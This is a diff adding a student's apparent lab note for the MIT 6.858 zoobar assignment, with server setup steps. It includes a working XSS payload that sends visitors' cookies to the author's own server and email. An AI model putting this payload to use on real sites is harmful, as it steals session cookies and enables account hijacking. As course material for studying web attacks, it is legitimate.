@@ -1,0 +1,28 @@
+We can not use this "http://css.csail.mit.edu/6.858/2017/labs/sendmail.php" script directly.
+since the script runs on mit's server and it requires that the user must specify a mit mail
+account.
+
+To bypass this restrict, I just start my own apache server and let the modified sendmail.php
+runs on my own apache server(the IP is 192.168.76.130") and specify the script as :
+<script>
+javascript:void((new Image()).src='http://192.168.76.130/sendmail.php?' + 'to=19930127zpf@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random());
+</script>
+in the begining of file users.html
+
+when zoobar server send users.html to a user, it will send the user's cookie to my sjtu email
+19930127zpf@sjtu.edu.cn (I alse tried qq mail, but it doesn't work).
+
+To start my own apache server:
+   sudo apt-get install php
+   sudo apt-get install apache2
+
+   sudo apt-get install sendmail
+
+   vim /etc/php/7.0/apache2/php.ini
+      smtp_port = 25
+      sendmail_path = /usr/sbin/sendmail -t
+
+   in the dirctory /var/www/html , create file sendmail.php
+
+   sudo service apache2 restart
+
